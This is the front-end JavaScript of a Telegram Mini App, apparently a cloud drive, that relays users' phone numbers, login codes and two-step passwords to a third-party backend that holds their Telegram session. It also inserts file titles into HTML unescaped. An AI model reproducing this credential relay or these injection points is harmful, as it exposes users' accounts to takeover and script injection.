const tg = window.Telegram.WebApp;
tg.expand();
tg.ready();

let currentCategory = 'all'; 
let cloudTotalCounts = {};

// 🔴 သင့် Render URL အမှန်ဖြင့် အစားထိုးပါ (အဆုံးတွင် / မပါရ)
const BACKEND_URL = "https://telegramcloudbackend.onrender.com";

let phoneHash = "", userPhone = "", pollingInterval, allFilesData = [];
let tgUser = tg.initDataUnsafe?.user;
let userName = tgUser && tgUser.id ? tgUser.id.toString() : "Web_Cloud_User_" + (localStorage.getItem("temp_uid") || Math.floor(Math.random() * 1000000));
if (!tgUser) localStorage.setItem("temp_uid", userName.split('_').pop());

function switchStep(stepId) {
    document.querySelectorAll(".step").forEach(el => el.classList.add("hidden"));
    let target = document.getElementById(stepId);
    if(target) target.classList.remove("hidden");
}

function setLoadingText(text) { document.getElementById("loading-text").innerText = text; }

// 💡 Telegram Name/Username (သို့) Account Name ကို Sidebar တွင် ပြသခြင်း
function setDisplayUsername() {
    let brandEl = document.getElementById("sidebar-brand-name");
    if(!brandEl) return;
    
    let displayName = "Telegram Cloud"; // Default Name

    if (tgUser) {
        if (tgUser.username) {
            displayName = "@" + tgUser.username;
        } else if (tgUser.first_name || tgUser.last_name) {
            let first = tgUser.first_name || "";
            let last = tgUser.last_name || "";
            displayName = (first + " " + last).trim();
        }
    } 
    // 💡 ပြင်ဆင်ချက် - tgUser မရရှိပါက Database ထဲရှိ Account Name ကို ပြသမည်
    else if (userName && !userName.startsWith("Web_Cloud_User_")) {
        displayName = userName; 
    }

    brandEl.innerHTML = `<i class="fa-brands fa-telegram text-blue"></i> ${displayName}`;
}

// --- 💡 Auto Login Check ---
window.onload = async () => {
    switchStep("step-loading");
    let cached = localStorage.getItem(`cloudData_${userName}`);
    let cachedCounts = localStorage.getItem(`cloudCounts_${userName}`);
    if (cachedCounts) { try { cloudTotalCounts = JSON.parse(cachedCounts); } catch(e) {} }
    
    if (cached) {
        try {
            allFilesData = JSON.parse(cached);
            updateCategoryStatus();
            renderFilesGrid(allFilesData);
        } catch(e) {}
    }
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_session`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        
        if(result.exists) {
            switchStep("step-success");
            fetchCloudData();
        } else {
            // 💡 ပြင်ဆင်ချက် - Desktop အတွက် သီးသန့်ခွဲထုတ်ထားသော Fallback ကို ဖယ်ရှားလိုက်ပါပြီ။ 
            // Mobile နှင့် Desktop နှစ်ခုလုံး တူညီသော UI ကိုသာ မြင်ရပါမည်။
            switchStep("step-phone");
        }
    } catch(e) { switchStep("step-phone"); }
};

// 💡 အသစ်ထည့်ရန် - UI တွင် ဖုန်းနံပါတ်ဖြင့်ဝင်မည့် အကွက်ကို ဖွက်/ဖော် လုပ်ပေးမည့် Function
function toggleManualLogin() {
    let area = document.getElementById("desktop-input-area");
    area.classList.toggle("hidden-fold");
    area.classList.toggle("show-fold");
}

// --- 📱 Phone Auth Flows ---
function handleMobileContact() {
    if (!tg.requestContact) return; 
    tg.requestContact(function(shared) {
        if (shared) {
            let userId = tg.initDataUnsafe?.user?.id;
            if (!userId) return showAlert("User ID ဖတ်မရပါ။", "Error");
            
            setLoadingText("Requesting OTP...");
            switchStep("step-loading");
            pollingInterval = setInterval(() => checkContactReceived(userId), 2000);
            
            setTimeout(() => {
                if(pollingInterval) {
                    clearInterval(pollingInterval);
                    showAlert("ချိတ်ဆက်မှု ကြန့်ကြာနေပါသည်။", "Timeout");
                    switchStep("step-phone");
                }
            }, 30000);
        }
    });
}

async function handleDesktopContact() {
    let phone = document.getElementById("manual_phone").value.trim();
    if (!phone) return showAlert("ဖုန်းနံပါတ် ရိုက်ထည့်ပါ။", "Notice");
    if (phone.startsWith("09")) {
        phone = "+95" + phone.substring(1);
    } else if (!phone.startsWith("+")) {
        phone = "+" + phone;
    }
    userPhone = phone;
    setLoadingText("Sending code...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/send_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone }) });
        let result = await res.json();
        if (result.success) { phoneHash = result.hash; switchStep("step-otp"); } 
        else { showAlert(result.message, "Error"); switchStep("step-phone"); }
    } catch (e) { showAlert("Connection Failed.", "Error"); switchStep("step-phone"); }
}

async function checkContactReceived(userId) {
    try {
        let res = await fetch(`${BACKEND_URL}/api/check_contact`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ user_id: userId }) });
        let result = await res.json();
        if (result.success) {
            clearInterval(pollingInterval); pollingInterval = null;
            userPhone = result.phone; phoneHash = result.hash;
            switchStep("step-otp"); tg.HapticFeedback.impactOccurred("medium");
        } else if (result.message) { 
            clearInterval(pollingInterval); pollingInterval = null;
            showAlert(result.message, "Error"); switchStep("step-phone");
        }
    } catch(e) {
        clearInterval(pollingInterval);
        pollingInterval = null;
        showToast("Connection Error. Please try again.", "error");
        switchStep("step-phone");
    }
}

async function verifyOTP() {
    let code = document.getElementById("otp_input").value;
    if(code.length !== 5) return showAlert("OTP ၅ လုံး ပြည့်အောင် ရိုက်ပါ။", "Notice");
    setLoadingText("Verifying...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone, code: code, hash: phoneHash, name: userName }) });
        let result = await res.json();
        if(result.success) {
            switchStep("step-success"); tg.HapticFeedback.notificationOccurred("success"); fetchCloudData(); 
        } else if (result.message === "2FA_REQUIRED") { switchStep("step-2fa"); } 
        else { showAlert(result.message, "Error"); switchStep("step-otp"); }
    } catch(e) { showAlert("Verification Failed.", "Error"); switchStep("step-otp"); }
}

async function verify2FA() {
    let password = document.getElementById("password_input").value;
    if(!password) return showAlert("Password ရိုက်ထည့်ပါ။", "Notice");
    setLoadingText("Unlocking...");
    switchStep("step-loading");
    try {
        let res = await fetch(`${BACKEND_URL}/api/verify_code`, { method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ phone: userPhone, code: document.getElementById("otp_input").value, hash: phoneHash, name: userName, password: password }) });
        let result = await res.json();
        if(result.success) {
            switchStep("step-success"); tg.HapticFeedback.notificationOccurred("success"); fetchCloudData();
        } else { showAlert("Password မှားယွင်းနေပါသည်။", "Error"); switchStep("step-2fa"); }
    } catch(e) { showAlert("Verification Failed.", "Error"); switchStep("step-2fa"); }
}

let currentOffset = 0; // 💡 နောက်ဆုံးရောက်နေတဲ့ နေရာကို မှတ်ထားမည့် Global Variable

async function fetchCloudData(isLoadMore = false) {
    let statusText = document.getElementById("cloud-status");
    let grid = document.getElementById("cloud-files-grid");
    let loadMoreBtn = document.getElementById("btn-load-more");
    let loadMoreContainer = document.getElementById("load-more-container");
    
    // 💡 အသစ်ပြန်ခေါ်ခြင်းလား၊ Load More နှိပ်ခြင်းလား စစ်ဆေးခြင်း
    if (!isLoadMore) {
        currentOffset = 0; // အစက ပြန်ဆွဲရင် 0 ကနေ ပြန်စမည်
        statusText.innerText = "Syncing with Telegram Cloud...";
        grid.innerHTML = "<div class='flex-center' style='grid-column: 1 / -1;'><div class='modern-spinner'></div></div>";
        if (loadMoreContainer) loadMoreContainer.classList.add("hidden");
    } else {
        // Load More နှိပ်လိုက်ရင် Loading လည်နေစေရန်
        if (loadMoreBtn) {
            loadMoreBtn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Loading...";
            loadMoreBtn.disabled = true;
        }
    }
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_cloud_data`, {
            method: "POST", 
            headers: {"Content-Type": "application/json"}, 
            // 💡 offset_id ကိုပါ Backend သို့ တွဲပို့မည်
            body: JSON.stringify({ name: userName, offset_id: currentOffset })
        });
        let result = await res.json();
        
        if(result.success) {
            // 💡 Load More ဆိုလျှင် အဟောင်းထဲကို အသစ်ရလာတဲ့ data တွေ ဆက်ပေါင်းထည့်မည် (Concat)
            if (isLoadMore) {
                allFilesData = allFilesData.concat(result.files);
            } else {
                allFilesData = result.files;
            }

            // 💡 Counts အသစ်ရလာပါက Update လုပ်မည်
            if (result.total_counts) {
                cloudTotalCounts = result.total_counts;
                localStorage.setItem(`cloudCounts_${userName}`, JSON.stringify(cloudTotalCounts));
            }

            // 💡 Base64 ပုံများကို ဖယ်ထုတ်ပြီးမှ LocalStorage တွင် သိမ်းမည် (Browser Quota Limit မဖြစ်စေရန်)
            let cacheData = allFilesData.map(f => {
                let { thumb_data, ...rest } = f; 
                return rest;
            });
            localStorage.setItem(`cloudData_${userName}`, JSON.stringify(cacheData));
            
            updateCategoryStatus();
            updateStorageUI(); // 💡 အသစ် - Storage ကို တွက်ချက်ပြီး ပြသမည်
            renderFilesGrid(currentCategory === 'all' ? allFilesData : allFilesData.filter(f => f.type === currentCategory));

            // 💡 နောက်တစ်ခါ Load More နှိပ်ရန် offset ကို မှတ်ထားမည်
            if (result.files.length > 0 && result.next_offset) {
                currentOffset = result.next_offset;
                // ဖိုင် ၅၀ အပြည့်ပါလာရင် နောက်ထပ်ကျန်နိုင်သေးလို့ Button ကို ဆက်ပြထားမည်
                if (result.files.length === 50) {
                    if (loadMoreContainer) loadMoreContainer.classList.remove("hidden");
                } else {
                    if (loadMoreContainer) loadMoreContainer.classList.add("hidden");
                }
            } else {
                if (loadMoreContainer) loadMoreContainer.classList.add("hidden");
            }

        } else {
            // 💡 Session ပျက်သွားပါက User ကို အသိပေးပြီး အစကနေ ပြန်ဝင်ခိုင်းမည်
            if (result.session_expired) {
                tg.HapticFeedback.notificationOccurred("error");
                showAlert("Your account sessoin Terminated! Please, reconnect.", "Session Expired", () => window.location.reload()); 
            } else {
                if (!isLoadMore) statusText.innerText = "Sync failed.";
                else showToast("Failed to load more files.", "error");
            }
        }
    } catch(e) { 
        if (!isLoadMore) statusText.innerText = "Connection error."; 
        else showToast("Connection error.", "error");
    }

    // 💡 Button ကို မူလအခြေအနေသို့ ပြန်ထားမည်
    if (isLoadMore && loadMoreBtn) {
        loadMoreBtn.innerHTML = "<i class='fa-solid fa-cloud-arrow-down mr-2'></i> Load More"; 
        loadMoreBtn.disabled = false;
    }
}
// 💡 Load More Button နှိပ်လျှင် ခေါ်မည့် Function အသစ်
function loadMoreFiles() {
    fetchCloudData(true);
}

// 💡 renderFilesGrid တွင် Icons များ အသစ်ထည့်သွင်းခြင်း
function renderFilesGrid(files) {
    let html = "";
    if(files.length === 0) {
        /* 💡 fa-google-drive နေရာတွင် fa-telegram ဖြင့် အစားထိုးလိုက်ပါသည် */
        html = "<div class='flex-center' style='grid-column: 1 / -1; color: var(--text-muted);'><i class='fa-brands fa-telegram mb-2' style='font-size:40px;'></i><p>Your drive is empty.</p></div>";
    } else {
        files.forEach(f => {
            try {
                // Icons အသစ်များ
                let iconClass = "fa-file-lines doc";
                if (f.type === "photo") iconClass = "fa-image photo";
                else if (f.type === "video") iconClass = "fa-film video";
                else if (f.type === "link") iconClass = "fa-link link";
                else if (f.type === "text") iconClass = "fa-note-sticky text";
                
                let thumbHtml = "";
                if (f.thumb_data) {
                    thumbHtml = `<img src="${f.thumb_data}" class="fc-thumb" loading="lazy" onerror="this.outerHTML='<i class=\\'fa-solid ${iconClass} fc-icon\\'></i>'">`;
                } else {
                    thumbHtml = `<i class="fa-solid ${iconClass} fc-icon"></i>`;
                }

                let safeTitle = f.title ? f.title.replace(/'/g, "\\'").replace(/"/g, "&quot;") : "Unknown File";
                let displayTitle = f.title ? f.title : "Unknown File";

                html += `
                <div class="file-card" onclick="openFile(${f.id}, '${f.type}', '${safeTitle}')">
                    ${thumbHtml}
                    <div class="fc-title">${displayTitle}</div>
                    <div class="fc-meta">${f.size || f.date}</div>
                </div>`;
            } catch (err) {}
        });
    }
    document.getElementById("cloud-files-grid").innerHTML = html;
}

// 💡 Category ရွေးချယ်သည့် Function
function filterFiles(type, element) {
    currentCategory = type;
    document.querySelectorAll('.nav-links li, .nav-item').forEach(el => el.classList.remove('active'));
    if(element) element.classList.add('active');
    
    let titles = { 'all': 'My Drive', 'photo': 'Photos', 'video': 'Videos', 'doc': 'Documents', 'link': 'Links', 'text': 'Notes' };
    document.getElementById('current-category').innerText = titles[type];
    
    updateCategoryStatus();
    renderFilesGrid(type === 'all' ? allFilesData : allFilesData.filter(f => f.type === type));
}

// 💡 စာသားကို 50 items synced | total 500 items ဟု ပြသမည့် Function အသစ်
function updateCategoryStatus() {
    let statusText = document.getElementById("cloud-status");
    let filtered = currentCategory === 'all' ? allFilesData : allFilesData.filter(f => f.type === currentCategory);
    let currentLoaded = filtered.length;
    
    let total = cloudTotalCounts[currentCategory] !== undefined ? cloudTotalCounts[currentCategory] : currentLoaded;
    
    if (total === 0 && currentLoaded === 0) {
        statusText.innerText = "0 items";
    } else {
        statusText.innerText = `${currentLoaded} items synced | total ${total} items`;
    }
}

function searchFiles(query) {
    let lowerQ = query.toLowerCase();
    renderFilesGrid(allFilesData.filter(f => f.title.toLowerCase().includes(lowerQ)));
}

async function saveCloudNote() {
    let noteInput = document.getElementById("note_input");
    let text = noteInput.value.trim();
    if(!text) return;
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin'></i>"; btn.disabled = true;
    try {
        await fetch(`${BACKEND_URL}/api/upload_note`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName, text: text })
        });
        noteInput.value = ""; tg.HapticFeedback.notificationOccurred("success"); fetchCloudData(); 
    } catch(e) {
        showToast("Failed to save note. Check connection.", "error");
    }
    btn.innerHTML = "<i class='fa-solid fa-paper-plane'></i>"; btn.disabled = false;
}

// 💡 တင့်တယ်လှပသော Toast မက်ဆေ့ချ် ပြသမည့် Function
function showToast(message, type = "normal") {
    let existing = document.querySelector(".toast");
    if(existing) existing.remove(); // အဟောင်းရှိရင်ဖျက်မည်

    let toast = document.createElement("div");
    toast.className = `toast ${type}`;
    toast.innerHTML = message;
    document.body.appendChild(toast);
    
    // ၃ စက္ကန့်အကြာတွင် အလိုအလျောက် ပျောက်သွားမည်
    setTimeout(() => {
        toast.style.animation = "fadeOut 0.3s forwards";
        setTimeout(() => toast.remove(), 300);
    }, 3000);
}

// 🚀 --- ဖိုင်နှိပ်လျှင် App မပိတ်ဘဲ Chat ထဲသို့ တိုက်ရိုက်ပို့မည့် UX --- 🚀
async function openFile(msgId) {
    tg.HapticFeedback.impactOccurred("medium");
    
    // ပို့နေကြောင်း User အား အသိပေးမည်
    showToast("<i class='fa-solid fa-spinner fa-spin mr-2'></i> Sending to chat...", "normal");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/view_file`, {
            method: "POST", headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ name: userName, msg_id: msgId })
        });
        let result = await res.json();
        
        if(result.success) {
            tg.HapticFeedback.notificationOccurred("success");
            // အောင်မြင်ပါက Swipe Down လုပ်ရန် အသိပေးမည် (App မပိတ်ပါ)
            showToast("<i class='fa-solid fa-check mr-2'></i> Ready! Swipe down app to view.", "success");
        } else {
            showToast("<i class='fa-solid fa-xmark mr-2'></i> Failed to send.", "error");
        }
    } catch(e) {
        showToast("Connection error.", "error");
    }
}

// ⚙️ --- SETTINGS & DISASTER RECOVERY --- ⚙️
async function openSettings() {
    tg.HapticFeedback.impactOccurred("light");
    document.getElementById("settings-modal").classList.remove("hidden");
    
    // Recovery Key လှမ်းယူမည်
    try {
        let res = await fetch(`${BACKEND_URL}/api/get_recovery_key`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        if(result.success) document.getElementById("recovery_key_display").innerText = result.key;
    } catch(e) { document.getElementById("recovery_key_display").innerText = "Error loading key"; }
}

function closeSettings() { document.getElementById("settings-modal").classList.add("hidden"); }

async function backupNow() {
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Backing up..."; btn.disabled = true;
    try {
        let res = await fetch(`${BACKEND_URL}/api/backup_all`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName })
        });
        let result = await res.json();
        if(result.success) showToast(`<i class='fa-solid fa-check mr-2'></i> ${result.count} files securely backed up!`, "success");
        else showToast("Backup failed.", "error");
    } catch(e) { showToast("Connection error.", "error"); }
    btn.innerHTML = "<i class='fa-solid fa-cloud-arrow-up mr-2'></i> Sync & Backup All Files"; btn.disabled = false;
}

async function restoreCloud() {
    let keyInput = document.getElementById("restore_key_input").value.trim();
    if(!keyInput) return showAlert("Please enter a Recovery Key.", "Notice");
    
    let btn = event.target.closest('button');
    btn.innerHTML = "<i class='fa-solid fa-spinner fa-spin mr-2'></i> Restoring Data..."; btn.disabled = true;
    try {
        let res = await fetch(`${BACKEND_URL}/api/restore_cloud`, {
            method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({ name: userName, key: keyInput })
        });
        let result = await res.json();
        if(result.success) {
            closeSettings();
            showToast(`<i class='fa-solid fa-check mr-2'></i> Successfully restored ${result.count} files!`, "success");
            fetchCloudData(); // Data အသစ်များကို ချက်ချင်း ပြန်ဆွဲပြမည်
        } else {
            showAlert(result.message || "Invalid Key.", "Error");
        }
    } catch(e) { showAlert("Restore Failed.", "Error"); }
    btn.innerHTML = "<i class='fa-solid fa-rotate-left mr-2'></i> Restore Now"; btn.disabled = false;
}

// 💡 Custom Alert Logic
let alertCloseCallback = null;

function showAlert(message, title = "Notice", callback = null) {
    alertCloseCallback = callback;
    document.getElementById("custom-alert-title").innerText = title;
    document.getElementById("custom-alert-message").innerText = message;
    
    let overlay = document.getElementById("custom-alert-overlay");
    overlay.classList.remove("hidden");
    
    // Animation အလုပ်လုပ်ရန် အချိန်အနည်းငယ် ခြားပေးခြင်း
    setTimeout(() => {
        overlay.classList.add("show");
    }, 10);
    
    if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred("warning");
}

function closeCustomAlert() {
    let overlay = document.getElementById("custom-alert-overlay");
    overlay.classList.remove("show");
    
    setTimeout(() => {
        overlay.classList.add("hidden");
        // OK နှိပ်ပြီးမှ ဆက်လုပ်မည့် အလုပ်ရှိပါက (ဥပမာ - Reload) ဆက်လုပ်ရန်
        if (alertCloseCallback) {
            let cb = alertCloseCallback;
            alertCloseCallback = null;
            cb();
        }
    }, 300);
}

// 💡 အသစ် - Access Key ဖြင့် Web မှ တိုက်ရိုက် Login ဝင်မည့် Function
async function loginWithKey() {
    let keyInput = document.getElementById("access_key_input").value.trim();
    if(!keyInput) return showAlert("Please enter your Access Key.", "Notice");
    
    setLoadingText("Verifying Key...");
    switchStep("step-loading");
    
    try {
        let res = await fetch(`${BACKEND_URL}/api/login_with_key`, {
            method: "POST", 
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ key: keyInput })
        });
        
        let result = await res.json();
        
        if(result.success) {
            // 💡 အရေးကြီးဆုံးအဆင့် - Backend မှပေးသော မူလ Account Name ကို LocalStorage တွင် ပြန်လည်အစားထိုးခြင်း
            userName = result.name;
            
            // အကယ်၍ Web Browser မှ ဝင်ခြင်းဖြစ်ပါက temp_uid ကိုပါ ညှိပေးမည်
            if (userName.includes("Web_Cloud_User_")) {
                localStorage.setItem("temp_uid", userName.replace("Web_Cloud_User_", ""));
            }
            
            setDisplayUsername(); // 💡 ပြင်ဆင်ချက် - Key ဖြင့် ဝင်လိုက်သောအခါ နာမည်ကို ချက်ချင်း ပြောင်းပေးမည်
            
            switchStep("step-success");
            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred("success");
            
            // ဒေတာများ ပြန်လည်ခေါ်ယူခြင်း
            fetchCloudData(); 
        } else {
            showAlert(result.message, "Login Failed");
            switchStep("step-key-login");
        }
    } catch(e) {
        showAlert("Connection Failed. Please check your internet.", "Error");
        switchStep("step-key-login");
    }
}

// 💡 Recovery Key ကို Click နှိပ်၍ Copy ကူးမည့် Function (Mini App & Web အားလုံးအတွက်)
function copyRecoveryKey() {
    let keyText = document.getElementById("recovery_key_display").innerText;
    
    if (keyText && keyText !== "Loading..." && keyText !== "Error loading key") {
        
        // Copy ကူးအောင်မြင်ကြောင်း ပြသမည့် UI Function
        const showSuccess = () => {
            showToast("<i class='fa-solid fa-check mr-2'></i> Key Copied to Clipboard!", "success");
            if(tg.HapticFeedback) tg.HapticFeedback.notificationOccurred("success");
        };

        // 💡 Telegram Mini App (WebView) များအတွက် Fallback Method
        const fallbackCopy = () => {
            let textArea = document.createElement("textarea");
            textArea.value = keyText;

            textArea.setAttribute('readonly', '');
            
            // Screen ခုန်မသွားစေရန် အပြင်ဘက်သို့ ဖွက်ထားခြင်း
            textArea.style.position = "fixed"; 
            textArea.style.left = "-99999px";
            textArea.style.top = "-99999px";
            document.body.appendChild(textArea);
            
            textArea.focus();
            textArea.select();
            
            try {
                let successful = document.execCommand('copy');
                if (successful) showSuccess();
                else showAlert("Failed to copy. Please copy it manually.", "Error");
            } catch (err) {
                showAlert("Failed to copy. Please copy it manually.", "Error");
            }
            document.body.removeChild(textArea);
        };

        // 💡 Web Browser များအတွက် Modern API ဖြင့် ဦးစွာစမ်းသပ်ခြင်း
        if (navigator.clipboard && window.isSecureContext) {
            navigator.clipboard.writeText(keyText).then(showSuccess).catch(err => {
                // Modern API ငြင်းပယ်ခံရပါက Fallback ကို အလိုအလျောက် သုံးမည်
                fallbackCopy(); 
            });
        } else {
            // လုံခြုံရေးကန့်သတ်ထားသော Mini App များအတွက် တိုက်ရိုက် Fallback သုံးမည်
            fallbackCopy();
        }
    }
}

// 💡 သိမ်းထားသော ဖိုင်များ၏ Size များကို ပေါင်း၍ GB/MB ဖြင့် ပြသမည့် Function
function updateStorageUI() {
    let totalMB = 0;
    
    allFilesData.forEach(f => {
        if(f.size) {
            let num = parseFloat(f.size.replace(/[^\d.-]/g, ''));
            if(!isNaN(num)) totalMB += num;
        }
    });

    let displaySize = "";
    if (totalMB >= 1024) {
        displaySize = (totalMB / 1024).toFixed(2) + " GB";
    } else {
        displaySize = totalMB.toFixed(1) + " MB";
    }

    let storageString = `${displaySize} of Unlimited used`;
    
    let sidebarText = document.getElementById("sidebar-storage-text");
    if (sidebarText) sidebarText.innerText = storageString;
    
    let settingsText = document.getElementById("settings-storage-text");
    if (settingsText) settingsText.innerText = storageString;

    let visualPercent = Math.max(3, Math.min((totalMB / 1048576) * 100, 85));
    
    document.querySelectorAll('.progress-fill').forEach(el => {
        el.style.width = visualPercent + '%';
    });
}
